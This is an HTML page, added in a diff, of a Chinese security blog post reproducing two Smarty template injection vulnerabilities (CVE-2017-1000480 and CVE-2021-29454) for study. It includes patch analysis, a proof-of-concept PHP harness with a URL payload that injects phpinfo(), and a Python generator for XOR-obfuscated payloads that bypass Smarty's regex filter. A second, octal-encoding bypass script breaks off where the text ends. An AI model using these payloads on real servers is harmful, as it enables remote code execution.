@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="好久没复现漏洞了，最近刷题时遇到了一道smarty模版注入，是cve-2021-xx改编的，便复现几个smarty的模版注入cve，争取逐渐捡起来落下的东西。 smarty是php模版生成工具，可以将很简单的自定义代码根据它的语法转换成php代码。 CVE-2017-1000480漏洞原理是smarty的display()会展示用户自定义模版，模板文件名可控，结合fetch()可通过get方式获取">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php-smarty模版注入RCE">
+<meta property="og:url" content="http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/index.html">
+<meta property="og:site_name" content="WhiteBai的博客">
+<meta property="og:description" content="好久没复现漏洞了，最近刷题时遇到了一道smarty模版注入，是cve-2021-xx改编的，便复现几个smarty的模版注入cve，争取逐渐捡起来落下的东西。 smarty是php模版生成工具，可以将很简单的自定义代码根据它的语法转换成php代码。 CVE-2017-1000480漏洞原理是smarty的display()会展示用户自定义模版，模板文件名可控，结合fetch()可通过get方式获取">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/DFF1F693-E94A-46A6-AE0C-EC0CC07C804A.png">
+<meta property="og:image" content="http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/C6D1CAFD-077C-451F-823C-35F44556EA2C.png">
+<meta property="og:image" content="http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/8B425F92-C089-45E3-AA7A-23D160A04376.png">
+<meta property="og:image" content="http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/DB37467D-76B3-4008-842E-CCE725E1554B.png">
+<meta property="og:image" content="http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/8671B076-B0FB-4309-9DFF-B3CB506C90DA.png">
+<meta property="og:image" content="http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/9F355EBA-AE79-494F-ADBF-C0BE40547D9D.png">
+<meta property="og:image" content="http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/CBCB1774-85AA-4E1D-9572-AFFDCCE0A190.png">
+<meta property="og:image" content="http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/D98205D2-0426-4B02-A00C-4C60C7B94B69.png">
+<meta property="og:image" content="http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/193A81EB-5208-4014-AFAA-6E1908E16525.png">
+<meta property="og:image" content="http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/2E8EB5E2-139C-4194-8C00-70D9A8077C9F.png">
+<meta property="article:published_time" content="2022-10-28T12:44:44.000Z">
+<meta property="article:modified_time" content="2022-10-29T09:56:23.400Z">
+<meta property="article:author" content="White Bai">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/DFF1F693-E94A-46A6-AE0C-EC0CC07C804A.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>php-smarty模版注入RCE</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/08/04/missevan%20%E5%8A%9F%E8%83%BD%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&text=php-smarty模版注入RCE"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&title=php-smarty模版注入RCE"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&is_video=false&description=php-smarty模版注入RCE"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php-smarty模版注入RCE&body=Check out this article: http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&title=php-smarty模版注入RCE"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&title=php-smarty模版注入RCE"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&title=php-smarty模版注入RCE"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&title=php-smarty模版注入RCE"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&name=php-smarty模版注入RCE&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://localhost:4000/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/&t=php-smarty模版注入RCE"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-1000480"><span class="toc-number">1.</span> <span class="toc-text">CVE-2017-1000480</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%BD%8D"><span class="toc-number">1.1.</span> <span class="toc-text">0x1 漏洞定位</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cve%E6%8F%8F%E8%BF%B0-%E5%8E%82%E5%95%86%E4%BF%AE%E8%A1%A5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">cve描述+厂商修补位置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">0x2 漏洞触发原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">原理分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-poc"><span class="toc-number">1.3.</span> <span class="toc-text">0x3 poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-29454"><span class="toc-number">2.</span> <span class="toc-text">CVE-2021-29454</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">0x1 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E7%AC%A6RCE"><span class="toc-number">2.1.1.</span> <span class="toc-text">无字符RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AEreg%E6%89%BE%E6%BC%8F%E7%BD%91%E4%B9%8B%E9%B1%BC"><span class="toc-number">2.1.2.</span> <span class="toc-text">根据reg找漏网之鱼</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-%E4%BE%8B%E9%A2%98"><span class="toc-number">2.2.</span> <span class="toc-text">0x2 例题</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        php-smarty模版注入RCE
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">White Bai</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-10-28T12:44:44.000Z" itemprop="datePublished">2022-10-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/PHP/" rel="tag">PHP</a>, <a class="tag-link-link" href="/tags/WEB/" rel="tag">WEB</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>好久没复现漏洞了，最近刷题时遇到了一道smarty模版注入，是cve-2021-xx改编的，便复现几个smarty的模版注入cve，争取逐渐捡起来落下的东西。</p>
+<p>smarty是php模版生成工具，可以将很简单的自定义代码根据它的语法转换成php代码。</p>
+<h2 id="CVE-2017-1000480"><a href="#CVE-2017-1000480" class="headerlink" title="CVE-2017-1000480"></a>CVE-2017-1000480</h2><p>漏洞原理是smarty的display()会展示用户自定义模版，模板文件名可控，结合fetch()可通过get方式获取模板文件名，同时在解析模版（即php代码）时未对文件名进行特殊字符过滤，造成RCE。</p>
+<blockquote>
+<p>这个cve的复现过程，我主要训练的是思路，即如何根据修补情况定位漏洞、漏洞触发原理以及怎么构造漏洞的利用条件，从而启发如何自己通过代码审计发现漏洞。</p>
+</blockquote>
+<h3 id="0x1-漏洞定位"><a href="#0x1-漏洞定位" class="headerlink" title="0x1 漏洞定位"></a>0x1 漏洞定位</h3><h4 id="cve描述-厂商修补位置"><a href="#cve描述-厂商修补位置" class="headerlink" title="cve描述+厂商修补位置"></a>cve描述+厂商修补位置</h4><p>根据cve的漏洞描述和受影响的版本介绍，从smarty修补情况（github）上定位漏洞的位置。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smarty 3 before 3.1.32 is vulnerable to a PHP code injection when calling fetch() or display() functions on custom resources that does not sanitize template name.</span><br></pre></td></tr></table></figure>
+<p>github上对3.1.32版本的change_log.txt找到：<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/DFF1F693-E94A-46A6-AE0C-EC0CC07C804A.png" alt="aaa"><br>然后search关键字，找到一个commit 614ad1f8b9b00086efc123e49b7bb8efbfa81b61，对三处代码进行了change<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/C6D1CAFD-077C-451F-823C-35F44556EA2C.png" alt="94e12fd639261795854ba902db1f8275"><br>可以看到主要是template文件名的特殊字符进行了替换，大概猜到漏洞原因是构造了特殊的自定义模板文件名造成的。</p>
+<h3 id="0x2-漏洞触发原理分析"><a href="#0x2-漏洞触发原理分析" class="headerlink" title="0x2 漏洞触发原理分析"></a>0x2 漏洞触发原理分析</h3><h4 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h4><p>从smarty 3.1.32对三处代码下断点。</p>
+<p>由于不熟悉smarty语法，对这三处进行静态分析时，找不到相关函数的上下文关系，即“Find Usage”失效，search 函数名又有太多处代码会调用create函数。因此转而通过动态调试进行分析。</p>
+<p>第一个想法是直接拿别人构造好的代码来用，但这样不利于漏洞利用链的构造。</p>
+<p>根据cve描述，漏洞通过display和fetch产生，利用smarty官网的display()demo，尝试函数能不能执行到create。很幸运，成功了。<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/8B425F92-C089-45E3-AA7A-23D160A04376.png" alt="a2192715ebe79b76bb5d161ceaa0de93"><br>查看寄存器，此时的$output值为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/* Smarty version 3.1.31, created on 2022-10-19 23:16:46</span><br><span class="line">  from &quot;[path]/templates/index.tpl&quot; */.........</span><br></pre></td></tr></table></figure>
+
+<p>即构造模版时会生成一段版权声明，文件名是通过display()传递的参数，而文件名可以构造，那么只要让前后的注释符闭合，中间插入恶意代码即可。</p>
+<h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>create的调用栈<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/DB37467D-76B3-4008-842E-CCE725E1554B.png" alt="05fba457e37f95e7d82618b249eca792"><br>核心smarty_template_compiled.php的process()，第100和103行，编译和加载模版过程<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/8671B076-B0FB-4309-9DFF-B3CB506C90DA.png" alt="853e702401f40ca280d022feeb9e9d7e"><br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/9F355EBA-AE79-494F-ADBF-C0BE40547D9D.png" alt="471dccfcc713362a5af6e8c23849cf26"></p>
+<h3 id="0x3-poc"><a href="#0x3-poc" class="headerlink" title="0x3 poc"></a>0x3 poc</h3><p>经过多次调试和代码追踪，display()都会执行到create()，结合fetch()，构造一个类模板，类名可get获得。直接用了<a target="_blank" rel="noopener" href="https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">chybeta</a>的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">include_once(&#x27;../libs/Smarty.class.php&#x27;);</span><br><span class="line">define(&#x27;SMARTY_COMPILE_DIR&#x27;, &#x27;/tmp/templates_c&#x27;);</span><br><span class="line">define(&#x27;SMARTY_CACHE_DIR&#x27;, &#x27;/tmp/cache&#x27;);</span><br><span class="line"></span><br><span class="line">class test extends Smarty_Resource_Custom</span><br><span class="line">&#123;</span><br><span class="line">  protected function fetch($name, &amp;$source, &amp;$mtime)</span><br><span class="line">  &#123;</span><br><span class="line">    $template = &quot;CVE-2017-1000480 smarty PHP code injection&quot;;</span><br><span class="line">    $source = $template;</span><br><span class="line">    $mtime = time();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$smarty = new Smarty();</span><br><span class="line">$my_security_policy = new Smarty_Security($smarty);</span><br><span class="line">$my_security_policy-&gt;php_functions = null;</span><br><span class="line">$my_security_policy-&gt;php_handling = Smarty::PHP_REMOVE;</span><br><span class="line">$my_security_policy-&gt;modifiers = array();</span><br><span class="line">$smarty-&gt;enableSecurity($my_security_policy);</span><br><span class="line">$smarty-&gt;setCacheDir(SMARTY_CACHE_DIR);</span><br><span class="line">$smarty-&gt;setCompileDir(SMARTY_COMPILE_DIR);</span><br><span class="line">$smarty-&gt;registerResource(&#x27;test&#x27;, new test);</span><br><span class="line">$smarty-&gt;display(&#x27;test:&#x27; . $_GET[&#x27;chybeta&#x27;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/demo/index.php?chybeta=*/phpinfo();/*</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/CBCB1774-85AA-4E1D-9572-AFFDCCE0A190.png" alt="c5f9510a1b157b5c8cff18a72c1987a4"></p>
+<h2 id="CVE-2021-29454"><a href="#CVE-2021-29454" class="headerlink" title="CVE-2021-29454"></a>CVE-2021-29454</h2><p>还是从<a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty/commit/215d81a9fa3cd63d82fb3ab56ecaf97cf1e7db71">github commit</a>入手<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/D98205D2-0426-4B02-A00C-4C60C7B94B69.png" alt="547399f3be5a1048abaf779af2b5fcfd"><br>增加对php规定字符、变量的匹配，并给出regexp的构造形式</p>
+<p>存在漏洞的版本，仅对传入的数学表达式进行php规定字符变量匹配，符合规定就eval<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/193A81EB-5208-4014-AFAA-6E1908E16525.png" alt="da076710d91d5bdec32c1fd89dfd3b98"><br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/2E8EB5E2-139C-4194-8C00-70D9A8077C9F.png" alt="785447238fb694d00cd627c442d5e3ce"><br>那么关键是如何绕过reg</p>
+<h3 id="0x1-利用"><a href="#0x1-利用" class="headerlink" title="0x1 利用"></a>0x1 利用</h3><h4 id="无字符RCE"><a href="#无字符RCE" class="headerlink" title="无字符RCE"></a>无字符RCE</h4><p>利用reg允许的字符集（0-9、a-zA-Z）、白名单函数拓展额外的字符集</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">expand_ascii</span>():<span class="comment">#0-9E.</span></span><br><span class="line">    rec = &#123;&#125;</span><br><span class="line">    var = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a,b</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(a)^<span class="built_in">ord</span>(b))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">expand</span>(<span class="params">s</span>):</span><br><span class="line">        keys = <span class="built_in">list</span>(rec.keys())</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> keys:</span><br><span class="line">            t = xor(s,c)</span><br><span class="line">            <span class="keyword">if</span> t <span class="keyword">not</span> <span class="keyword">in</span> rec.keys():</span><br><span class="line">                rec[t] = rec[s]+rec[c] <span class="comment">#记录新扩展的字符由哪两个元字符构成（list+list=&gt;list）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">expand_all</span>():</span><br><span class="line">        <span class="comment">#构造0-9E. 字典 rec = &#123;dict&#125;&#123;&#x27;0&#x27;:[&#x27;0&#x27;]&#125;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            rec[<span class="built_in">str</span>(i)] = <span class="built_in">list</span>(<span class="built_in">str</span>(i))</span><br><span class="line">        rec[<span class="string">&quot;E&quot;</span>] = [<span class="string">&quot;E&quot;</span>]</span><br><span class="line">        rec[<span class="string">&quot;.&quot;</span>] = [<span class="string">&quot;...&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):<span class="comment">#</span></span><br><span class="line">            expand(random.choice(<span class="built_in">list</span>(rec.keys())))</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> rec.keys():</span><br><span class="line">            c = Counter(rec[k]) <span class="comment">#计算每个value的值的重复个数</span></span><br><span class="line">            rec[k] = [_ <span class="keyword">for</span> _ <span class="keyword">in</span> c.keys() <span class="keyword">if</span> c[_] % <span class="number">2</span>] <span class="comment">#扩展字符集的数据处理，比方说&#x27;k&#x27;=X^Y=&#x27;3&#x27;^&#x27;..,&#x27;^&#x27;3&#x27;^&#x27;E&#x27;=&#x27;...&#x27;^&#x27;E&#x27;，需要剔除重复的，即异或后为0的</span></span><br><span class="line">            <span class="built_in">print</span>(rec)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">        expand_all()</span><br><span class="line">        <span class="comment">#制定模板</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            c = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+i)</span><br><span class="line">            var[<span class="built_in">str</span>(i)] = <span class="string">f&quot;((<span class="subst">&#123;c&#125;</span>.<span class="subst">&#123;c&#125;</span>)[0])&quot;</span></span><br><span class="line">        var[<span class="string">&quot;E&quot;</span>] = <span class="string">&quot;((exp(100).b)[15])&quot;</span>  <span class="comment"># exp(100)==2.6881171418161E+43</span></span><br><span class="line">        var[<span class="string">&quot;...&quot;</span>] = <span class="string">&quot;((exp(100).b)[1])&quot;</span>  <span class="comment"># point =&gt; .</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_code</span>(<span class="params">cmd</span>): <span class="comment"># 参数命名时要以其实际含义，而不是参数类型，一开始仅想到str，但是str具体代表什么呢</span></span><br><span class="line">        code = [<span class="string">f&quot;(<span class="subst">&#123;<span class="string">&#x27;^&#x27;</span>.join(rec[c])&#125;</span>)&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> cmd] <span class="comment">#利用字符集构造命令</span></span><br><span class="line">        <span class="comment">#f&quot;(&#123;&#x27;^&#x27;.join(rec[c])&#125;)&quot; 如何得到&#x27;(5^E)&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;.&quot;</span>.join(code)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">replace_var</span>(<span class="params">code</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> var.keys():</span><br><span class="line">            code = code.replace(c,var[c])</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_exp</span>(<span class="params">expr</span>):</span><br><span class="line">        var_expr = [<span class="string">&quot;=&quot;</span>.join((<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+i),<span class="built_in">str</span>(i))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;string: &#123;math equation=&quot;%s&quot; %s&#125;&#x27;</span> % (expr, <span class="string">&quot; &quot;</span>.join(var_expr))</span><br><span class="line"></span><br><span class="line">    init()</span><br><span class="line">    func = replace_var(generate_code(<span class="string">&quot;phpinfo&quot;</span>))</span><br><span class="line">    payload = generate_exp(<span class="string">f&quot;(<span class="subst">&#123;func&#125;</span>)()&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+<h4 id="根据reg找漏网之鱼"><a href="#根据reg找漏网之鱼" class="headerlink" title="根据reg找漏网之鱼"></a>根据reg找漏网之鱼</h4><p>匹配中仅剔除反引号、美元符（该符号可自定义变量），可以构造八进制字符串实现（八进制特征：反斜杠、数字）</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;(&quot;phpinfo&quot;)()&#x27;</span></span><br><span class="line">string = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    <span class="keyword">if</span> i == 